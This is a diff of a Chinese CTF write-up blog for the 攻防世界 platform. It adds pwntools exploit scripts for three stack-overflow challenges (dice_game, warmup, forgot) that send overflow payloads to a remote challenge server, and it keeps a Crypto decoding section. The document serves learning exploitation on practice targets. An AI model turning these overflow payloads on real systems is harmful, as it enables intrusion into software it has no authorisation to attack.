@@ -84,7 +84,68 @@
     <div class="row">
         <div class="col-md-8 offset-md-2 ">
             <div class="post-content py-5 z-depth-3 main">
-                <h1 id="攻防世界wp"><a href="#攻防世界wp" class="headerlink" title="攻防世界wp"></a>攻防世界wp</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="enc"><a href="#enc" class="headerlink" title="enc"></a>enc</h3><p>题目是由 ZERO 和 ONE 组成的二进制编码，如下：<br><img src="https://i.loli.net/2019/07/13/5d2986f6aa1ba13253.png" alt="enc1"></p>
+                <h1 id="攻防世界wp"><a href="#攻防世界wp" class="headerlink" title="攻防世界wp"></a>攻防世界wp</h1><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h3><p>拿到题目先查看下保护</p>
+<p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g50z6bhldkj30g902s74l.jpg" alt></p>
+<p>再运行下程序，可以看出是一个猜数字的游戏</p>
+<p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g50z7doxi4j30g9032wet.jpg" alt></p>
+<p>用ida打开，猜对50次即可得到flag</p>
+<p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g50z7qsu2fj30gc0ejq5b.jpg" alt></p>
+<p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g50z7zt0faj30gc04igma.jpg" alt></p>
+<p>read函数存在栈溢出，覆盖seed随机数种子为0或1，srand构造伪随机数，get flag</p>
+<p>exp:</p>
+<pre><code class="python">#!/usr/bin/python
+# -*- coding:utf-8 -*-
+
+from pwn import *
+from ctypes import *
+p=remote(&#39;111.198.29.45&#39;,&#39;36448&#39;)
+libc = cdll.LoadLibrary(&quot;libc.so.6&quot;)
+p.recv()
+payload=0x40*&quot;a&quot;+p64(0)
+p.sendline(payload)
+
+a=[]
+for i in range(50):
+    a.append(libc.rand()%6+1)
+print(a)
+for i in a:
+    p.recv()
+    print(p.recv())
+    p.sendline(str(i))
+p.interactive()</code></pre>
+<h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>一道简单的栈溢出</p>
+<p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g50zc52vogj30gc03nt98.jpg" alt></p>
+<p>没有开任何保护</p>
+<p><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g50zcputspj30du05ht9i.jpg" alt></p>
+<p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g50zcy8xxfj30du01xjri.jpg" alt></p>
+<p>sub_40060D这个函数可以查看flag</p>
+<p>通过栈溢出覆盖返回地址到sub_40060D</p>
+<p>exp:</p>
+<pre><code class="python">#!/usr/bin/python
+# -*- coding:utf-8 -*-
+
+from pwn import *
+io = remote(&#39;111.198.29.45&#39;, 58345)
+sys_addr = 0x40060d
+io.recv()
+io.send(&#39;a&#39;*(0x40+8)+p64(sys_addr))
+io.interactive()</code></pre>
+<h3 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h3><p>也是一道简单的栈溢出，和上题差不多</p>
+<p>直接附程序和exp</p>
+<p>exp:</p>
+<pre><code class="python">#!/usr/bin/python
+# -*- coding:utf-8 -*-
+
+from pwn import *
+io = remote(&#39;111.198.29.45&#39;,46530)
+sys_addr = 0x080486CC
+io.recv()
+io.sendline(&#39;iyou&#39;)
+io.recv()
+io.sendline(&#39;a&#39;*(0x20+4) + p32(sys_addr))
+io.interactive()
+</code></pre>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="enc"><a href="#enc" class="headerlink" title="enc"></a>enc</h3><p>题目是由 ZERO 和 ONE 组成的二进制编码，如下：<br><img src="https://i.loli.net/2019/07/13/5d2986f6aa1ba13253.png" alt="enc1"></p>
 <p>0x00</p>
 <p>首先将 ZERO 和 ONE 替换成 0 和 1，再转成字符串</p>
 <p>得到 <code>Li0gLi0uLiAuIC0uLi0gLS4tLiAtIC4uLS4gLSAuLi4uIC4tLS0tIC4uLi4uIC0tLSAuLS0tLSAuLi4gLS0tIC4uLi4uIC4uLSAuLS0uIC4uLi0tIC4tLiAtLS0gLi4uLi4gLiAtLi0uIC4tLiAuLi4tLSAtIC0tLSAtIC0uLi0gLQ==</code></p>
